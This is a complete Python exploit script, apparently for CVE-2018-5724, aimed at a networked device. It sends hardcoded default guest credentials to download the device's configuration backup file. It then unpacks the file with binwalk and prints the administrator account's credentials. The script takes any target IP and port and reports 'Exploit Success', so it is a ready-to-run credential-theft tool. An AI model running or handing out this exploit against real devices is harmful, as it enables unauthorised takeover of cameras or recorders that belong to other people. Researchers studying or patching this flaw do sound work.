import requests
import sys
import os
from colorama import Fore

description = r"""
 -------------------------------------------------------------
|                                                             |
|                           JoGen                             |
|                                                             |
 -------------------------------------------------------------
"""
# Packet Request
def packet(target, port):
	# user Account
	#headers={'Authorization': 'Basic dXNlcjp1c2Vy', 'Upgrade-Insecure-Requests':'1'}

	# guest Account
	headers={'Authorization': 'Basic Z3Vlc3Q6Z3Vlc3Q=', 'Upgrade-Insecure-Requests':'1'}
	url="http://"+target+":"+port+"/tmpfs/config_backup.bin"
	s=requests.Session()

	print Fore.CYAN+"[+] Sending the payload "+target+Fore.RESET
	r=s.get(url, headers=headers)

	if r.status_code == 200:
		print(Fore.CYAN+"[+] Exploit Success"+Fore.RESET)
		print("")
		print("")
		backupfile(r)
	else:
		print (Fore.YELLOW+"[-] Exploit Fail : "+str(r.status_code)+Fore.RESET)
		sys.exit(2)

# File extract
def backupfile(r):
	file = open('backup.bin','wb')
	for chunk in r.iter_content(100000):
		file.write(chunk)
	file.close()
	os.system("binwalk -e backup.bin >/dev/null")
	print (Fore.CYAN+"[+] Admin Account"+Fore.RESET+Fore.YELLOW)
	os.system("cd _backup.bin.extracted ; strings 0 | grep -A2 'user0'; cd ../ ; rm -rf _backup.bin.extracted ")
	print (Fore.RESET)

# MAIN
if __name__ == "__main__":
	print description
	if len(sys.argv) is not 3:
		print(Fore.YELLOW+"[-] Example: python cve-2018-5724.py <Target IP> <port>"+Fore.RESET)
		sys.exit(1)
	else:
		packet(sys.argv[1], sys.argv[2])
